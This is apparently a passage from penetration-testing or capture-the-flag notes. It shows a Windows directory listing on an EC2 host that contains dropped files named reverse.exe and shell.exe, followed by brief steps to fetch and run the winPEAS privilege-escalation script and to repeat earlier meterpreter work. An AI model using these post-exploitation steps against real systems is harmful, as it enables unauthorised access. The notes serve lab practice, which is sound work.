08/06/2019  01:13 PM             8,795 Amazon_SSM_Agent_20190806141239.log
08/06/2019  01:13 PM           181,468 Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI.log
08/06/2019  01:13 PM             1,206 cleanup.txt
08/06/2019  01:13 PM               421 cmdout
08/06/2019  01:11 PM                 0 DMI2EBC.tmp
08/03/2019  09:43 AM                 0 DMI4D21.tmp
08/06/2019  01:12 PM             8,743 EC2ConfigService_20190806141221.log
08/06/2019  01:12 PM           292,438 EC2ConfigService_20190806141221_000_WiXEC2ConfigSetup_64.log
02/10/2022  02:41 PM    <DIR>          Microsoft
02/10/2022  02:43 PM                 0 reg.hiv
02/10/2022  02:25 PM            73,802 reverse.exe
02/10/2022  03:22 PM            73,802 shell.exe
        #there it is

#3 repeat pulling winPEAS.bat
        #except I already had it there from previous privesc

#4 run winPEAS
#and we got the original install date and could repeat the same stuff we did in meterpreter in this shell:)
